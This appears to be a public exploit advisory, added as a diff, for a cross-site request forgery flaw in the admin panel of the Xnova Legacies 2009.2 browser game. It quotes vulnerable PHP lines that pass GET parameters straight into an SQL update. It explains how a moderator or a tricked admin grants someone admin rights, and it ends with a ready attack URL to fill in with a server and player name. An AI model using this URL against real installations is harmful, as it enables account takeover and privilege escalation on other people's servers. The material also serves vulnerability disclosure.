@@ -1,0 +1,28 @@
+# Exploit Title: Xnova Legacies 2009.2 CSRF
+# Date: 27/1/2011
+# Author: @xploitaday
+# Software Homepage: http://www.xnova-ng.org/
+# Software Link: http://downloads.tuxfamily.org/xnlegacies/releases/xnova-legacies_2009.2.tar.gz
+# Version: 2009.2
+
+Vuln file: admin/paneladmina.php
+Vuln Lines:
+108-117
+				case 'usr_level':
+					$Player     = $_GET['player'];
+					$NewLvl     = $_GET['authlvl'];
+
+					$QryUpdate  = doquery("UPDATE {{table}} SET `authlevel` = '".$NewLvl."' WHERE `username` = '".$Player."';", 'users');
+					$Message    = $lang['adm_mess_lvl1']. " ". $Player ." ".$lang['adm_mess_lvl2'];
+					$Message   .= "<font color=\"red\">".$lang['adm_usr_level'][ $NewLvl ]."</font>!";
+
+					AdminMessage ( $Message, $lang['adm_mod_level'] );
+					break;
+
+Description:
+If you are a moderator, you can set you admin.
+And if an admin visit this link, you be will granted with admin privileges (control of game)
+
+Replace SERVER and PLAYER with yours
+					
+Attack url: http://SERVER/admin/paneladmina.php?result=usr_level&player=PLAYER&authlvl=3
